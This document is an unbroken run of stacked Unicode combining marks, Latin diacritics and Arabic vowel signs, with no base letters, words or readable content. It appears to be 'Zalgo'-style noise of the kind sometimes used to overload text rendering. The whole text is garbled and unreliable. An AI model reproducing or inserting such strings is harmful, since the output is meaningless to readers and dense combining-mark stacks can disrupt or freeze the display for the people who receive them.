ًٌٍَُِّ̣̖̝͖͑̓ͧ́̀͐͝͡҉̸̵̴ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̢̢̨̡̞̱͍͈͈̦̻̙̻͍̯̙͖͉̳̩̭̻̗͖̥̘̮̉̀ͭ̆ͩͦ͋̀̒͗ͭ̒̒̅̃̐̉̈ͣ̏ͬ̅͘͘̕͘͜͢͜͠͠͡ͅ҉̵̵ًًٌٌٍٍَُُِِّّ̡̡̨̺̻̠̟̻̬̮̗̓̍̀ͦͭ̈̊̚͡҉َ͏ًٌٍُِّ̹̟̐̿̑͆͡ͅ͏̵̴̷̴̶̶ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̨̡̧̛̛̛̜̳̫̭̱̝̲̺̦͍̲̲̹͉̰̗̭̤̻̥̩̖͎̘̳͍̭̠̭̔̾ͬ̐͋ͦ͐̏́̔ͮ̅͂̈̿̑͌̀ͧͬͯ̒͒ͧͮ͘͢͟͟͜͢͟͢͢͜͠͡͝͝͝҉ًٌٍَُِّ̧̨͖͓̤͕̑̅̌͟͏ٌٍُِ̢͎̫̃̍҉̵̵̵̶̴̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̨̢̡̢̧̨̨̢̛͇̤͙͍̘̥̖͈̪̙͍̤̫̞̥̺̘̗͈̟̭̰͙̪̩̻̼͙̼ͫ̎̌ͪͭ͂̀̐̌̌͐̀ͬ̑͊̔̾ͨ̀ͩ̓̃̈́̾͋ͨͬ̿̕͢͢͜͢͜͠͞҉̴̶̸̵̴ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̛̛̱̠̱̭͖̝̳͚̯̘̖̬͓̖̿͂̌̀ͣ̈́̃ͧ̋̈̄͗͂̾̄̐̈́̕̚͘͢͝͞ͅͅ҉̴̶ًًٌٌٌٍٍٍََُُُِِِّّّ̡̛̟̣̳̥̪̤̤͓͇͕ͦ͂̏ͫͭͭ̀ͪ̕͟҉̴ًٌَُِ̨̥̣̈́̌ͮ͟͏̷̷̷̷̷̸̷̵̵̷̴ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̧̨̧̡̨̛̛̦͎̱̣͉̣̰̣̩̗̪͔̱̲̣̖̼̙̥̮͕̯͎̙̖̣͔̱̹͛ͥ́ͩ̐͐ͥͤ̍̀̔̐́͂ͯ̉̈́ͫ͛̒͌̑́͑́̆ͨ͊̀̐́͑̊̊̆̒̕̕̕͘͘͘͟͢͜͜͟͢͝͠͡͞͠ͅ҉̶̵̴ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̡͇͕͉̜͖̘̹̱ͥ͑ͨ́͆̆̏̆̌̅̚͡͞͞͝͠ͅ͏̶̸ًًٌٍٍََُُِِّّ̳̺̜̱̥̩̰̩̋͋̄̈̆ͬ͢͜҉̸̶̴̷̷ًٌٌٍٍَُِِّّ̫̗͙̯̳͂͆ͧ̈ͨ͘͏َ̜͋͏ً̟͊͏ٌٍَُِّ̨̝̬̹̅ͨ̿̑͏̵̸ًًًٌٌٌٍٍََُُُِِّّ̢̩̠̪̹̥̜̫̗͑ͨͬ̿̎͗ͧ̈́̐̉̋͘̚͟͟͡͞ͅ͏ًٌٍَُِّ̢̙̗̳̬̘̑͢͝҉ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̨̻̺̮̻͉̖̙̮͍̪̭͔̼̞̫͒̐͐ͨͪ̀̀̓ͬͭ̀̏̿̆ͩ͑̌̕̚̕͘͢͠͡͡͞͞҉̸̵̶̷̶ًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̬͖̬̭̯̮̝̹̭͎ͫ͗́̅ͩ̋ͩ̏ͬ̽̃̊ͭ͘͟͟͢͢͞͞͡҉̶̶̸̷̶̶ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̢̡̢̧̢̧̢̛̛̫̘̟̻̲̝̫̘̬͇̩̼͚̻̹̝̺̥͓̜͕̣̝̘̖̼̳̬ͪ͊̊ͩ̏́̆͐̄̃̋̽́̈́͑ͩ̎̾̉ͦͨͣ̎ͮͯ̕̚̕͢͟͜͞͡͞͡͡҉̷̶̸̵̸̶ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̡̥̞̬̠̘͉̦͖̬̩͉͍̻̥ͣ̄͒͂ͣͯͪ̍̒ͩ̑̋̓͗̄́ͮ̾̕͟͝͝҉̵̶ًٌٍَُِّ͎͖̂̐̑҉ًًٌٍَُِّ͓ͥͭ͜҉̴̷̴̸ًًٌٌٍٍََُُُِِّّ̢̯̖͖̖̦̜͕͈̣̲͗́̏ͪ̄̇̽̎ͮ̄ͮ͘͘͟͏̴ٌٍِ̺ͨ͡͏̴̴̷̷̵̶̴̵̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̡̨̡̧̡̨̛̦͙̠̼̝̩̞̹̮̬̭̹̲̤̭̲̼̮̥̲̱̰͔͉̟͚̰̼̙̲͓̦̩̬͇̼̭̞̲̗͇̮͉̺̊ͧ͛̇̎̃ͭ̇ͣ̓̓͗ͬ͂͂͗͑̀̇͛̿̊͗ͫ̽̐ͮͮ͛̂ͩ̋̊ͪ͘̚̕͘͜͢͟͜͜͡͝͝͞͡͞҉ًٌَُّ̯̯͋̾̄͜͏̸ًٌٍَُِّ̬͍̒͑̏̀͑̀ͣͅ҉̶̷̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̳̳̹̦̘͙̬̬̺̭̳̘̝̭̲̝̾ͨͦͣ̂͑ͪ̃́ͭͦ͑́ͥ̀̕̕̕͜͢ͅ҉ِ̚͏ًًٌٌٍٍٍََُُِِّّّ̦̝̪̤͔̞͉̞̮̣̉̑̉ͭͮ̇̋̉̌̕͘͟͞͝͡҉ًٌَُِ̨̳͙ͪ̿̓͡҉̷̵ًًٌٌٍٍٍَََُُِِّّّ̢͍͔̺͎̤̟̰͓͉̝ͣ͑ͮͬ̔́ͯ͊͠͡҉̵̵ًًٌٍَُُِّ̨̤̙̠͈̞̑̓̿̉͂̌͟͠͏̸̸̵̷̷ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̢̢̨̛͇͈̞̲̣̤̗̝̲̣͚̖̰͊̔̀̓ͯ̇͊ͭ̏͒͡͏̶̷ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̧̡̨͇̺͖̭̺̦͚̳̄̉ͪ̊̔ͤ̀̀̌̀̋ͫ̐̓̋̃ͫ̒̐͢͟͡͝ͅ͏ًٌٍٍَُِّّ̳͎̟̗̓̏ͯ̈́́̕͟͝҉̷̸̵̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̢̛̥̙̪͖̘̥̹̙͚̲̙̣̞̠̭̲̪̦̫̳̯͙̺̺̭̜̉̆̈́̂̈́̐̏̍̋̽̓̏̀̌́͋̍̑̓͒ͫ͑ͧ̉̀̍ͤ̚̕͘̕͜͟͜͡͝͠͝͝҉̷̶̶̸̷̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̢̧̨̨̛̛̞̺̩̩̭̺̭̺̩̪̝ͧͯ̉͌̄ͯ́͐ͦͦ̅̽ͫ̀̃̈́̔͘͘͟͢ͅ҉̷̷̸̴̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̡̢̡̧̡̨̨̛̠̝͖͎̜͚̯͙̣̹͖̱̖̟̝̪̻͓̲̖̻̟̥̻̗̔̿͆̍̀̍͒̅ͨ̀̍̈ͬͮ̅́͘̕̕͟͜͟͡͏̸̷ًٍَُِّ̤̫̥ͦͫ͋̓͝҉̴ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّ̛̛̜̜̰͔̟̭̖͎̜̙̘̜̝̦̲̱͙̀͆́ͣ͑̒͆̋̒̌́ͪ̍ͨ̓̈ͦ̕͢͠͠͏̵̵̶̸̸ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̡̛̛̛̝̰̝̩̞͕̭̥̜̣͓̦̞͖̞̮̺̯̙̹̳͍̣̞̻̣̭͈͇̩͍̙̰ͨͣ̔ͪ̓̏̋̉ͧ̄̀ͩ́̌ͫ̿́ͥ̅͒ͭ̇ͬ̉͘̕̕̕͟͟͢͟͞͝ͅ͏̴̶ًًٌٌٍٍٍَََُُِِّّّ̢̢̢̨̫̤̙͍ͮͥ̄̿͛ͪ͊̚̕͘ͅ͏ًٌُ͓̰ͤͨ͏̷ًٌٍَُِِّ̡̻͕̤͑̔̐̀͟͞͝҉̸̶̶̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̡̨̨̛̛̻͍̻̖͉̦̼̖̬̭̺̗̱̳͔͓̫͖͖͖̟̼̜̦͉̹ͭ̃͊͛̒̐́́̏ͭ̇͊͌͆͑ͧͮ͊ͤ̐͋ͯ͂̑̎̕̕͘͘̕͢͜͝͠͡͞͝ͅͅ҉̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̢̧̨̧̧̡̛͈̥̜̲̥̟̝̞̗̱̺̖̜̫̘̠̤̖̝̝͚̬͙͇̑ͣ̂́̊̄̀ͨ̋̾́ͨ́̈́̎ͤ̑̍ͮ̍ͭ̔ͨ̆̕͟͢͜͟͡͠͠͞ͅ͏ًًٌٌٍٍََُُِِّّ̡̧̧̛̹̮̭̼̞́̌͛̑̄͢͞͏̷ًًًٌٌٌٍٍَََُُُِِّّّ͉̖͕̻̗̺͎̯̖̖̒̋ͭ̀̈́͆ͥ́̏̄ͮ̐̚͟͢͡͏̶̵̸̷̴̴̴̸̷̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̡̡̛̛̛̤͔̹̦̠͕̺͎̗͔͕̬͈̗͖͎̗̺̦̦̠̫̙̯̫͉̞̲͖͇̫̟̙͎͓͉̳̞̥ͤͯ̇̾́͆̂̓ͫ͒͂͗̒͗ͮ̈́̅̐̍͆ͥ̅ͮ̄ͮ̆̈́ͣͨ̾͊̈́ͪ̔̅̈́̎͂̃̐͋̍ͪ͘͘͟͢͟͠͠͠͠͞͞͡͝ͅ҉̵̸̸̸̷̸̸ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̨̨̛̛̛̛̰̥̯͓̝̤̜̤̺̼̻̼̥̬͈̺͙̣̜͇̘̼̖̺̜̜̘͕̮̮͎̩͙͚͒ͬͦ̀̇̾̅͌̿̓ͯ̓̈́̇̍̀̿́̀͋́̔̀̎͋́̊̾̆̎̚͘͜͟͟͟͟͟͞͞͞͞͠͡͞ͅͅ͏̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̢̧̢̢̧̣͈͓̭͎̣͉͕̯̘̦̲͖̖̺̺̣͂̈́̀͌̔̃̅̽̄̏͑̾ͪ͟͟͢͢͜͜͝͡҉̴̷̴̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̛̯̟̙̦̤̠̪̤̱͙̪͔͉́̂́ͩ͆ͧ̅͆ͨ͋̀ͫ̈̕̚̚͜͜͢͡ͅ͏̴̵̵̵̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّّ̧̡̡̨̨̢̧̧̨̛͖͎̫̭̬̪̖̠̬̭͔͖̘̯̪̞̖̭̭̫̹̗̳̠͚̤̺̦͎̟̩̽́̆ͭ̍̾͆̈́͋ͤ͒ͫ̔̀̾̔ͣ̌̄̀ͫ̓͛͊̀̉̀̀̓̈̄̆͊̊̕̕̕͜͟͢͠͝͝͞͝͝͝ͅ͏̴̴ًًٌٌٍٍََُُِِّّ̛̞̯̗͉͙̋ͩ̇͋̏̿̓̕͜͢͟͜҉̵̵̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̛̭͎̲̻̺̯̳̫̝͇̼̳͖̗̤ͣͭ̎̎̿͗̌ͩ͋̈́͛̀̀́̆͋ͬ͛͆̒̀̐̕̕̚͟͞͠͠҉̸̷̵̷̵̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̧̧̨̢̧̛̹̤͍̩̲͈̼̹̰̼͍̭̺͔̝̤̖̜̭̗̰̫͚̥̼̠̼͎̰͋͒̔̄͌̋̀ͯ͐̀̆̽́̃̓͋̃̋̄̈́̏͌͐̒ͭͮͦͬ͘̕̕͘̕͢͢͠͝͝͠͏̸̸ًًًٌٌٌٍٍَََُُُِِّّّ̛͈̲̣̮̤̪̯̣̠̻̗̳́͌͂͊̃̌ͬ̔̈́́̍ͫ͘͟͢͟͠͝҉̷ًًٌٌٍٍٍَََُُِِِّّّ̢̧̧̛̹̥̜̱̱̣̯̤̭͍́̌̎̉̆͆̍͌̈́ͧ̽̃͘͢͠҉̵̷ًًٌٌٍَُُِِّ̨̟̳̤̬̜̗ͥ̓͗̅ͣ̄͟͠҉̶ًًٌٌٍٍََُُِّّ̼͉̫̀̿̀̏ͣ́͞͏ًٍَِّ̤̘̤̞ͧ͘͏̴ٌٍُِ̙͚̗̐͞͞͏ّ̩͗҉َ̟͑͏̶̴̶ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̤̻̠͖̱̤̣͈̗̰͈̪͉͔̱͉͎͉̭ͭͨ̀͆͌̾̀̎̎ͭ͋̏ͬ͐͊͌͗͆̾̏̿̅̚̕͝͞͞͞͝͡͠͠ͅ҉̸ًٌٌٍٍَُُِِّ̙͉̝̏̅̏ͩ́̑͌͝͞͏ًٌٍَُِّ̺͍̫͔̽̀̀̈̓͌͡͏̵̸̸̷̶̴̵̷̴̸̴̸̸̸ًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّ̨̧̨̢̢̨̨̧̢̡̛̛̛͖͙̫̦̭͕̳͈̤̝͓͇̰͚̯̭͉̱̫̙̬̬͔̲̗̦̖̭̼̰͚̰͕͔̙͕̣̤̳̯̮̭̳̟̱̮̗͍̼̜̘͙̦̠̂̍ͣ̀̄́̂ͦͤ͊̆͋̓̀ͧ͛̆̂͑̎̇̓̎̒̃ͣ̒ͪ́ͮͤ̄͊̊ͩͪ̉̃̿͗̃ͨͤ̀̇͊̐͗̇̐̑ͤͮͬ̔́͑̎͘̚̚͘̕͘̕̕͘̕͘͜͜͜͡͝͝͞͠͝͞͠͡͝ͅͅͅ҉ٌ̍҉ًٌٍٍََُِِّّ̧̨̛͉̝̥͕̗͈͍̼̥̆ͯͥͮ͌͌̽͜͠͞҉̸̶̶̷ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̨̡̢̛̼̩̺̥͖̰̰̞͕̘̘͙̗ͨ̅̌̌̀͊ͥ̀́̃́̆͂̏̋̕͜͝͝͡ͅ҉ًًًٌٌٌٍٍٍَََُُُِِّّّ̡̛̖̥̞̟̜̱̪̗͓̞͌͆̓̉̆̍ͮͣ̈͋̌͑̉͜͜͢͡͞͠ͅ͏̴̶ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̧̡̧̡̛̳̗̞͎̪̟͇̠̘̱ͦ͛͋̂̆̑̀̎ͨ̆̏̆͠͡͞҉ًٍَُّ̢̥͎ͪ͞҉ًٌٌٍَُِِّ̢̛͎̥̦͉̳̥ͧͣͣ͐̏ͅ͏̶̸̷̸̶̷̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّّ̢̧̧̧̡̡̧̢̧̛̛̜̙͙̬͚̭̖̞͍̰̘̘͈̠̜̯̎̿̍ͥ́͑̅̂ͯͦ̌̆̔̊ͦ̎͒̾ͭ̀͒͛̈́͛͊͐̂͘͘͘͜͢ͅ҉ًَ͟͏ُ͊҉̴̵ًًٌٌٌٍٍََُُِِِّّ̢̨͖̭̥̙͈͔̤̠̼̪̲́̈́̈́͑́͌͗̕͟҉̶ًٌٍٍَُِّ̛̛̰̎̔̕̚͏ّ̪҉َ̹҉̶̵̵̶̷̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̢̨̨̢̡̧̧̛̛̛̛̛̤̱̦̝̞̩̝̱͇̩̮̹͙̖͕̳̠̙̹̺͓̹̣̝͕̣̗̼͎̜͓̟̼͔̥̥͐ͥͣ́̄́͊̇̋ͩͦ̌͗̄̓́̑̅̐ͫ͋̔̑́ͫ̈̉ͧͣ̐ͪͧ̓̒̾̈̓͗̀̇̓ͧ̈̕͜͢͜͡͠͞͝͡͝ͅͅͅ҉̷ًٌٍََُِّ̖̲̹ͧ́̎̒ͭͥ͠͏ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̡̡͇̺̣̬͓͙͎̺̗̝͌̽̎ͩ̈́̽̄̋ͨ́̃̀̓̕͟͠҉ًًٌٌٍٍٍََُُِِّّّ̡̡̙̘̙̗̗̼̺̬ͪ̄̎̀̀ͫ̍́̏̾͝͝͠͏̶̶̷̶̵̸̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̢̧̢̨̡̛̛̳̰̠̠͓͎̗̮̫̻͕͕͖̣̞̯̺̮̣͔̼̫͓͍͕̤̜̯͎͍̻̱̪̭͖̞̄͗̇̊̀̓ͨ̇ͮ̓̄ͦ̊̐̈ͣ̌̂ͫ́́̂͌̓͗͘̕̚̕̕͘͟͜͟͞͡͞҉ًٌٍََُِّ̛̛̣̟̘̝̼̀ͧ̿̊͝҉ًٌُ̟͇͂̓҉̶̴̸̵̶̵ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̧̢̨̨̨̛͇̤̪̺̝͍͍̹͕̤͙̬͉̣͉͙͖͎̽͂̌͒ͦ̇̌ͮͣ̅͒̊̏̅ͧ̀ͣ͋̎͐ͧ͐̉ͩ͒ͤ̐̕̕͜͜͜͢͟͠͏̸ٌٍَِّ̮͔̓̎҉̷̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̫̘̠̼̳̳̺͖̽̅̀ͤ̏͛́́̍͛̑̀͗̚̕͞͝҉̴ًًًٌٌٌٍٍََُُُِِِّّ̢̨̧̗̠̦͕̠̎̔̔ͩ̀̀͊̾ͣ͆̚͜͝͡ͅ͏̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̛̗̖̤̠͔͕̖̻̤̖̗̙͖̖̩̊̌̀͑ͮ̇̈̒ͧ̔ͤͭ̀̒̍ͥ͠͠҉̸ًًًٌٌٍٍٍَََُُُِِِّّّ̡̛̛̥͉̰̳̯̭͍̘͇̣̦͇͒ͦͦ̅̾́͆ͤ̅̅̽̕͘͟͜͟͢͏̴̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̡̨̡̨̛̛̬͙̪̣̝͓̘̠͓̠͔̰̫̬̲͍̮͉̋͂̔̈́ͣ͂ͭ̍͋̽͋̉̂ͦͭ̎̽ͧ̈́̕͟͢͡͡͡҉̴̸ًًٌٌٍٍٍَََُُِِّّّ̧̢̧̩̖̗̦̠̝̩̯ͮ͊́̃̾̄͂̾͘͝͠ͅͅ҉ًًٌٌٍَُُِِّ̡̢̭̜͕̗̌̀̂͑͟͝҉ًٌٍٍَُِّ̗͓͓̺͚͖̓͒̎͋͡҉̷̵ًٌَُِّ͕̤͓̀ͭ͢͏̴ًًًٌٌٍٍٍَََُُِِّّّ̛̘̰̹͓̩͈̖̺͉̥͎̀ͬ̋ͬͥ͂́͌̎͒̾͢͠҉ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̢̧͖͓̻̖͉͙͔͔̘͂ͬ̏́͐̋ͫ̄̄ͮ̾̕͟͟͞͠͞҉ٌٍِّ̞̙̭́̓҉̸̸ًًًٌٌٌٍٍَََُُُِِِّّ̧̥̹͖̭̱̼̯̲͔̟͈̘̟̜̾͋͒͒͋ͫ͛͋̕̕͘͡͠҉̸ًٌٍَُِّ̧̢̬̟̀ͥͭ̍҉ٍّ̰̣͋҉̶̵̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّ̨̨̳͔̞͎̦̥̞͎͖̘̦͕̻̹̻̞̩͇̥͉̤͆̈̎̈̽ͤ̽̄̈́ͫ͐̎̏̿ͪͩͥ́͊͘͘͘͜͜͝͠͡͠͠͞͞͏̷̶̵ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̛͕̰͎͕͎͍̹͇ͩ͆ͯ̈́̍͐́̾ͧ͘͘͘͜͜͝͞͝͏̷̵̸̷̸̴̴̸̴̸̶̸̴̴̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّّ̡̢̡̢̢̨̨̛̛̛̦̪̞͓̳̪̝͖̤̼͈̻̮̦̯̰̮̟̫͇̤͚̠̞͍͉̘̪̰͚̦̭̫͙̻̮̹͙͉͉̬͍͓̞̦̦͇͕̟̥̗͇͔̬ͯͤ͊̐ͬ̔ͥ̌̐̄͂̌̇̄́͐́̎ͥ̔̂̀̈́͊ͦ̅̀̀ͤ͊̒͊̇̽̀͑̆ͪͨ̇̑̉̂ͭ͐̂̽ͭ̌̀̆́̈̕͘͜͜͢͢͢͜͢͝͞͡͡͝͞͡͡͠͠ͅ҉ًٌَُِ̨̥̤̀̇͜͟͏̸ًًٌٌٍٍََُُِّّ̢̨̨̨̹̦̻̙̳̭̩̻ͭ̋̇ͪ͋͒̉͜҉̴̴̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̨̳̗̠͚͙̹͕̩͖̳̦͔̳̤̹͂͗̋͋̋͐̅̀̽͗͛́̂̄͗̏̿̚͝͡͠͞͡ͅ҉̸̴̴̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̧̨̢̧̗̮̠̥͚͈̗̘̠̻͚͕̰͍̬̲̼̃ͦ̏̆̊̑͆ͯ̋̀̍̆ͪ̔́ͧ̂̉ͮ͟͝ͅ͏̵̵̸̸̷̶̷̸̶̵̷̴̸̶ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̢̢̧̨̛̛͈̩͎̥̫͈̹͓̮̰̜͉̮̲̘͉͇͈̻̠̥̬͙̼̭̰̘̪̭̖̣͉͈̻̙̦̭̼̜̒̅̀̃̽̓̊̃̀̾̄̔͑͛̉̌͑́͆̔ͨ̈́ͨͪͯ̀̄ͦ̑́͛̅̿ͪ̌́ͫ̉̾̆͌ͧͣ̒̆̎̈́ͯ͑ͦ̉̕̕̕̚̕͘͜͟͞͠͠͝͠͝ͅ҉̴̷̵̸̶̷̵̷̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̨̨̢̢̧̢̧̧̡̡̞͎̼͍̤̞̩̟̳̹̺̭̹̦̪͔͖̻̼̖͔̲̜͍̯͇͕̘̫͈̥͓̪̾̓̎͗̈́̑̂̋ͪͫ̆̃͐͆ͭͧͨͧ̒̎̈́́͑ͤ̍ͮ̂́͋̀͌ͩͨ̌ͯͥͭ̀̇̆͐̌͋͑̇̀͌̀̕̚͘͟͜͟͟͠͠͞͠ͅ҉̷̴ًٌٍٍَُِِّ̡͙͓̬̱̗̼̜́ͫͨ̈͢͏ّ̘͏̷̸ًًًٌٌٌٍٍٍََََُُُِِِّّّ̧̢̢̛͉̮̺̳̰͍̗̪̜̹̍̈́̓̅̿̉̾ͨ͑́́̚͠͝҉̵̴̷̵ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̢̛̛̜̱̻̞͉̻̲̺̖ͥ̄̃̀́̄̍̐̈́͒̓̚̚͜͞͡҉̸̵ًًًًٌٌٌٍٍٍٍََََُُُُِِِّّّّ̧̢̢̛̗̺̺̜͇̘̖̜̯̠̺͓̜̫̺̳͗ͦͣ͊ͧ̎̊ͩͥͩ̾͌̀ͩ͟͢͜͠͝҉ًٌٍَِّ̼̱͙̒̓̒͟҉̴ًٌٍَُُِّ̞̰̲̖̅̐͐̉͜͡҉̶̶̶̷ًٌٌٍٍَُِِّ̢̺̙̯͙̝ͬͫ̈́̆͟͡͝͏̸̷̷̴̸̷̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̧̡̢̢̢̢̢̛̛͍̝̺̳̻͎͍̲̯̮̥̦̩̣̖̗͍̮͓̯͖̪̫̠͉̯̇ͮͤ̑ͦ̾ͣ̈́͛͗ͥ́͐͒̇́̓̏̅͒͗̿̈͗̀̃͋̂̐͘͘͘͟͟͜͜͢͢͠͠͠͝ͅ҉̷̴̴ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̢̨̡͖͎̙͓̠͖͇͈̤͇ͪ̔ͥͮͣ͊ͣ̍͑̅ͮͦ̀ͮ͠͞҉̵̶̷̸̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̡͉͕̙͈͓̻̻̠͇̪̫͖̭̬͙̤̥̗͍͓̩̬̮̈̿̄̊͋̓́̄ͮ̂̓̽͗̒ͨ̄̔̀̇̾͆̈́͋͢͢͝͡͡͠ͅ҉̸̷ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̨̨̛̱͍͉͔̯̲̬̲̩͈̦͖͂ͦ͛͂͛̀̈͐ͫ͐̀̄̅͘̚͜͜͠͡҉̵̶ًٌٌٍَُِِّ̞̼̘͔̲̿͑ͬ̌̅͜͏̸̴̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̨̛̛̫͉̠͈͈͙̯̻̙̫̘̩̝̩ͮ̊̄̓ͭ̐ͮ́̒́ͭͣ̀̕̕͞͞͞ͅ͏ٍَّ̘͋ͯ̚͝͏̴ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̢̛̛̛̩̬̩̹̲͇̰͎̭̹̤̤ͪ͒̈ͯ͐͂̆ͮ́̃͂ͪ̃̕͜͟͡͝͠҉̴̴̶ًًًٌٌٌٍٍٍٍَََُُُِِِّّّ̨̛̗̫͔̳̞̻̲̰͖͆̐ͫ̆̀ͥ̀̆͊̚̕͝͠͞҉̵̷̵̸ًًًٌٌٍٍَََُُِِّّّ̡̡̳̝̭̮̬͙̹̮̃͛́̈̂̐̓ͯ͠҉ًًٌٌٌٍٍََُُُِِِّّ̨̨̡̡̻̟͕̯̯ͧ͒̈́͐́̂̐ͣ̀ͬͯ͘͜͝͞҉̴̸ًٌٍٍَُِّ̩͓̙͖̚͜҉ًٌَُّ͉̻̮͎͐͆͠͝͏̴̸̷̸ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̡̨̨̛̯̤͙̮͇̺̲̗̱͔̻̜͚̖͔̥̻͚͉͚̤̮͕͙̹͍̦͇̺̠̖͇̤̰͓̀ͯ͒̉̀̄ͪ͒ͯ͒̀̾̀͒ͨͮ́ͪ̊ͮ̾͌͗́̉̈́̑́̇ͯ̒͊̀ͦ̚͘̕̕̕͟͢͟͞͡͡͡ͅ҉̷̶̷ًًًٌٌٍٍٍَََُُِِّّّ̧̧͙̜͎̘̠͇ͤ͑ͭ͂́ͭ͟͠҉̵ًًٌٌٍٍََُُُِِّّ̧̨̭̙̭̠̭̥̳ͬ̔̎͐̕̕͞҉ٌٍِ̘̳̙ͭͪ̀̕҉̸̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̧̧̡̢̣̤͉̪̤͖̖̺͙̠̫̣̹͓͌́͌̓̆ͪͥ͑ͦͩ̒̽ͨ͆́̀̓ͬ̅̓̈́̕͘͟͞͞͠͝͞͡ͅͅ